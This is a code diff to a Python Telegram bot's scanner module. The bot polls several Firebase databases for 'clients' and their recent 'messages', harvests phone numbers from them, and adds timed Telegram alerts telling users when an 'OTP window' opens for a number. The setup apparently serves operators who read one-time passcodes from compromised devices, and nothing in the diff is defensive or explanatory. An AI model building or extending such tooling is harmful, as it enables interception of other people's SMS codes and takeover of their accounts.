@@ -3,6 +3,7 @@ from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CopyTextBu
 import database as db
 import firebase_utils as fbu
 from utils.ui import sc
+from utils.helper import get_ist_time_str
 
 log = logging.getLogger("Scanner")
 
@@ -82,31 +83,25 @@ async def start_scanner(bot):
             log.error(f"Scanner error: {e}")
             await asyncio.sleep(1.0)
 
-# 🔥 BACKGROUND SCANNER (24/7 No Stop)
-async def backup_scanner():
+async def backup_scanner(bot):
     log.info("Backup Scanner Started...")
     while True:
         try:
             d = db.load_data()
             fbs = d.get("firebases", [])
             if fbs:
-                # Fetch all devices shallowly
                 all_devs = []
                 for fb in fbs:
                     clients = await fbu.fetch_fb(f"{fb['url']}/clients.json?shallow=true", fb.get("auth"))
                     if clients and isinstance(clients, dict):
-                        for dev_id in clients.keys():
-                            all_devs.append((fb, dev_id))
+                        for dev_id in clients.keys(): all_devs.append((fb, dev_id))
                 
-                # Prioritize devices with no backup or old backup
                 now = int(time.time())
                 missing = []
                 for fb, dev_id in all_devs:
                     bkp = d.get("device_backups", {}).get(dev_id, {})
-                    if not bkp.get("numbers") or (now - bkp.get("time", 0) > 172800):
-                        missing.append((fb, dev_id))
+                    if not bkp.get("numbers") or (now - bkp.get("time", 0) > 172800): missing.append((fb, dev_id))
                 
-                # Check 10 random missing devices
                 random.shuffle(missing)
                 for fb, dev_id in missing[:10]:
                     msgs = await fbu.fetch_fb(f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=20", fb.get("auth"))
@@ -119,13 +114,34 @@ async def backup_scanner():
                             if "device_backups" not in d: d["device_backups"] = {}
                             d["device_backups"][dev_id] = {"numbers": nums, "time": int(time.time())}
                 
-                # Cleanup old backups
                 if "device_backups" in d:
                     for dev_id in list(d["device_backups"].keys()):
-                        if now - d["device_backups"][dev_id].get("time", 0) > 172800:
-                            del d["device_backups"][dev_id]
+                        if now - d["device_backups"][dev_id].get("time", 0) > 172800: del d["device_backups"][dev_id]
                 db.save_data(d)
-            await asyncio.sleep(10) # Short sleep to keep scanning continuously
+
+            # 🔥 TIMER ALERTS
+            timers = d.get("upcoming_timers", {})
+            now = int(time.time())
+            changed = False
+            for key, t in list(timers.items()):
+                if t.get("alert_5m") is False and (t["target_time"] - now) <= 300:
+                    try: await bot.send_message(t["user_id"], f"⏰ <b>{sc('otp alert')}</b>\nAapka OTP aane wala hai (5 min baaki)!\n📞 <code>{t['number']}</code>", parse_mode="HTML")
+                    except: pass
+                    t["alert_5m"] = True
+                    changed = True
+                if t.get("alert_2m") is False and (t["target_time"] - now) <= 120:
+                    try: await bot.send_message(t["user_id"], f"⏰ <b>{sc('otp alert')}</b>\nSirf 2 minute bache hain!\n📞 <code>{t['number']}</code>", parse_mode="HTML")
+                    except: pass
+                    t["alert_2m"] = True
+                    changed = True
+                if now >= t["target_time"] and t.get("alert_now") is False:
+                    try: await bot.send_message(t["user_id"], f"🚀 <b>{sc('otp window open')}</b>\nAb try karein!\n📞 <code>{t['number']}</code>", parse_mode="HTML")
+                    except: pass
+                    t["alert_now"] = True
+                    changed = True
+            if changed: db.save_data(d)
+            
+            await asyncio.sleep(10)
         except Exception as e:
             log.error(f"Backup Scanner error: {e}")
             await asyncio.sleep(10)
